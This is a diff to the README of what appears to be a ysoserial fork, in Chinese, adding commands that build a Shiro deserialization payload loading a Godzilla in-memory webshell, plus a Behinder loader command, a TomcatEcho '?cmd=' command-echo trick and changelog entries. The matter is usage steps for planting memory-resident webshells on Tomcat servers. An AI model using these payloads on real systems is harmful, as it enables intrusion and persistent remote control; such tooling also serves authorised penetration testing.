@@ -21,10 +21,13 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 ` mvn clean package -DskipTests`
 
 ### shiro 内存马注入
+生成哥斯拉反序列化Loader数据，配合poc中 GodzillaPostData.txt 中的 post 内容即可完成哥斯拉内存马注入
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shell/GodzillaLoader.class > godzilla.ser`
+
 
 使用对应链进行生成反序列化文件 (这个BehinderLoader 只是一个 loader，需要配合特定的 Post 数据才能完成注入，Post 注入的数据暂时不打算公开）
 
-`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shell/BehinderLoader.class > demo.ser`
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shell/BehinderLoader.class > behinder.ser`
 
 使用 TomcatEcho 可以进行输出回显，在url中添加 `?cmd=命令` 即可获得回显
 
@@ -37,6 +40,8 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 
 ### 更新日志
+2021.0617 从 Shiro attack 中分离出了 GodzillaLoader 以及 Post 内容，并稍做了些修改
+
 2021.0527 利用 classloader 实现了依赖隔离，支持 cb 1.9.2 和 cb 1.8.3 (基于 c0ny1 师傅的思路)
 
 2021.0525 可以引入构造好的 class 直接进行 shiro Tomcat 内存马注入，同时可直接调用加密函数进行加密
